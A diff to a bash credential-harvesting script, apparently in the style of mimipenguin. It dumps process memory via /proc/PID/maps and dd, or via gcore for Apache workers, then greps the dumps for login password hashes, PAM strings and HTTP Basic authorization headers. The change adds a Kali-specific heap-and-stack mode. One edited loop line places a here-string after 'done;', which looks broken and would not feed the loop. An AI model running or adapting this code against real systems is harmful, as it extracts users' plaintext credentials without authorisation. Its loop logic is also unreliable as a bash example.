@@ -16,9 +16,15 @@ export RESULTS=""
 
 dump_pid ()
 {
+	system=$3
 	pid=$1
 	output_file=$2
-	grep -E "^[0-9a-f-]* r" /proc/$pid/maps | egrep 'heap|stack' |cut -d" " -f 1 |
+	#if kali, only dump stack and heap to save time
+	if [[ $system == "kali" ]]; then
+		mem_map=$(grep -E "^[0-9a-f-]* r" /proc/$pid/maps | egrep 'heap|stack' | cut -d" " -f 1)
+	else
+		mem_map=$(grep -E "^[0-9a-f-]* r" /proc/$pid/maps |cut -d" " -f 1)
+	fi
 	while read memrange; do
 		memrange_start=`echo $memrange | cut -d"-" -f 1`;
 		memrange_start=`printf "%u\n" 0x$memrange_start`;
@@ -27,7 +33,7 @@ dump_pid ()
 		memrange_size=$(($memrange_stop - $memrange_start));
 		dd if=/proc/$pid/mem of=${output_file}.${pid} ibs=1 oflag=append conv=notrunc \
 			skip=$memrange_start count=$memrange_size > /dev/null 2>&1
-	done;
+	done; <<< "$mem_map"
 }
 
 parse_pass ()
@@ -110,7 +116,7 @@ if [[ $(uname -a | awk '{print tolower($0)}') == *"kali"* ]]; then
 	#if exists aka someone logged into gnome then extract...
 	if [[ $PID ]];then
 		while read -r pid; do
-			dump_pid "$pid" /tmp/dump
+			dump_pid "$pid" /tmp/dump "kali"
 			HASH="$(strings "/tmp/dump.${pid}" | egrep -m 1 '^\$.\$.+$')"
 			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
 			DUMP="$(strings "/tmp/dump.${pid}" | egrep '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
@@ -179,6 +185,8 @@ if [[ -e "/etc/apache2/apache2.conf" ]]; then
 		#Dump all workers
 		while read -r pid; do
 			gcore -o /tmp/apache $pid > /dev/null 2>&1
+			#without gcore - VERY SLOW!
+			#dump_pid $pid /tmp/apache
 		done <<< "$PID"
 		#Get encoded creds
 		DUMP="$(strings /tmp/apache* | egrep '^Authorization: Basic.+=$' | cut -d' ' -f 3)"
